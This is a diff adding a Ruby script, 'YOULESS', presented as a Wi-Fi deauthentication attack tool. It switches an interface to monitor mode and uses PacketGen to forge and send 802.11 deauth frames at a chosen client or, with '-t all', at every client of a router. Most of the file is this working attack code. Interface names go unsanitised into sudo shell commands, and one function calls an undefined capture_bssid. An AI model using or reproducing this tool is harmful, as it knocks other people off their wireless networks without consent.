@@ -1,0 +1,183 @@
+require 'optparse'
+require 'colorize'
+require 'packetgen'
+require "csv"
+
+
+options = {}
+
+iface = nil
+count = nil
+target = nil
+bssid = nil
+scan_file = "wifi_scan"
+
+
+      
+      begin
+       OptionParser.new do |opts|
+        opts.banner = "Usage: ruby youless [options]"
+        opts.on('-i','--iface IFACE',"Specify Interface") do |interface| 
+        	options[:iface] = true
+        	iface = interface
+        end
+
+       	opts.on('','--deauth COUNT ',"Deauth Attack (Specify Count)") do  |c|
+       		options[:count] = true
+       		count = c 
+       	end
+
+       	opts.on('-t','--target TARGET/all','Specify single target Mac / all for all the clients in the Network') do |target_arg|
+       		options[:target] = true
+       		target = target_arg
+       	end
+         
+        opts.on('-b','--bssid BSSID','Specfy Router BSSID') do |bssid_arg|
+                options[:bssid] = true
+                bssid = bssid_arg
+       end
+
+
+       	opts.on('-v','--version','version') do 
+       		options[:version] = true
+       	end
+
+       	opts.on('-c','--check-mode','Check mode if not the change it to Monitor mode') do 
+       		options[:mode] = true
+       	end
+
+       	opts.on('-h','--help','Specify Help') do
+       	     puts `figlet YOULESS`.colorize(:blue).bold
+             puts "-"*65
+             puts "        YOULESS  -  Wireless DEAUTH ATTACK".colorize(:light_blue).bold
+             puts "                Developed by Rubal Sharma (YOU)".colorize(:red).bold
+             puts "-" * 65
+             puts opts
+             exit
+     end
+          opts.separator ""
+          opts.on("Example: ruby youless -i <interface> -t <target> -b <router_bssid> --deauth 10")
+          opts.on("Example: ruby youless -i <interface> -t all -b <router_bssid> --deauth 10")
+          opts.on("Example: ruby youless -i <interface> -c")
+          opts.on("Example: ruby youless -i <interface> --bssid")
+
+
+       	end.parse!
+
+        rescue OptionParser::MissingArgument
+        	puts "Interface and options must be Specified"
+        	exit
+        end
+
+        	if options.empty?
+       		puts "Use -h for help"
+       		exit
+       	end
+
+         if options[:iface].nil?
+          puts "Interface must be Specified"
+        end
+
+
+
+#Check if wireless interface support monitor mode
+	def check_mode(iface)
+		puts "[*] Changing into Monitor Mode......"
+		mode = `sudo iwconfig 2>/dev/null` 
+
+		if !mode.include?("#{iface}")
+			puts "[-] Interface Not Found or Monitor Mode not supported!".colorize(:red).bold
+			exit
+		end
+
+		if mode.include?('Monitor')
+			puts "[+] Monitor Mode Already Enabled"
+			return
+		end
+		
+	if mode.include?("Managed")
+        `sudo ifconfig #{iface} down`
+        `sudo iwconfig #{iface} mode monitor`
+        `sudo ifconfig #{iface} up`
+        puts "[+] Monitor Mode Enabled"
+        return
+end
+        mode = `iwconfig #{iface} 2>/dev/null`
+         if mode.include?("Mode:Monitor")
+         	puts "[+] #{iface} Monitor Mode Enabled".bold
+         else
+         	puts "[-] #{iface} not changed to Monitor Mode! May not supported. YOU CAN CHECK MANUALLY".colorize(:red).bold
+         	exit
+         end
+     end
+ 
+
+
+#Deauth attack
+     def deauth_attack(iface,target,bssid,count)
+     	packet = PacketGen.gen('RadioTap').
+     	add('Dot11::Management',
+     		mac1: target,
+     		mac2: bssid,
+     		mac3: bssid,
+     		type: 0,
+     		subtype:12
+               )
+     	.add('Dot11::DeAuth',reason:7)
+     	sleep 3
+         puts "[*] Sending Deauth Packets......"
+         count.to_i.times do  |i|
+         	packet.to_w(iface)
+         	sleep 0.01
+         	puts packet.to_s.unpack('H*')
+         	if i == 10
+         	puts "[*] Resetting USB Wi-Fi Adapter.......[For Safety]"
+
+  system("echo '2-1' | sudo tee /sys/bus/usb/drivers/usb/unbind > /dev/null")
+  system("echo '2-1' | sudo tee /sys/bus/usb/drivers/usb/bind > /dev/null")
+  puts "[+] Adapter Reset Done ✅"
+  sleep 3
+
+   `sudo ifconfig #{iface} down`
+        `sudo iwconfig #{iface} mode monitor`
+        `sudo ifconfig #{iface} up`
+        check_mode(iface)
+
+
+end
+     end
+end
+
+
+
+
+# Retry Logic if no APs are found
+def retry_capture(iface, retries, reason)
+
+    puts "[!] #{reason}. Retrying......".colorize(:yellow)
+    capture_bssid(iface, retries)
+  
+end 
+
+
+
+#Conditions
+if options[:iface] && target && target.downcase == 'all' && options[:bssid] && options[:count]
+  target = 'ff:ff:ff:ff:ff:ff'
+  check_mode(iface)
+  deauth_attack(iface, target, bssid, count)
+  exit
+
+elsif options[:iface] && options[:target] && options[:bssid] && options[:count]
+  check_mode(iface)
+  deauth_attack(iface, target, bssid, count)
+
+elsif options[:iface] && options[:mode]
+  check_mode(iface)
+
+end
+
+
+if options[:version]
+puts '1.0'
+end 
